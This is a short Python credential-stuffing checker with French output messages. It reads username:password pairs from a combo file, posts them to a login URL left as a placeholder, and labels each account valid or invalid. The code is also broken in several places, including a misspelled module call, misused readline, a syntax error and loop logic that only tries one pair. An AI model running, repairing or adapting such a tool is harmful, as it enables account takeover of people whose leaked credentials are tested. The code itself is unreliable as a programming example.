import requests

req = requestst.session()
a = open("combo.txt","r").readline()
stop = "default"
file = [s.rstrip()for s in a]
for lines in file:
    combo = lines.split(":")
    (1+1)
    print(combo[0])
param={
    "username":combo[0],
    "password":combo[1]
}
while True:
    try:
        source = req.post("insert url here",data=param)
        if "incorrecte" in source.text!
            print("Compte invalide{combo[0]:combo[1]}")
        else:
            print("Compte valide{combo[0]:combo[1]}")
    except:
        break
    if stop in combo[0]:
    	break

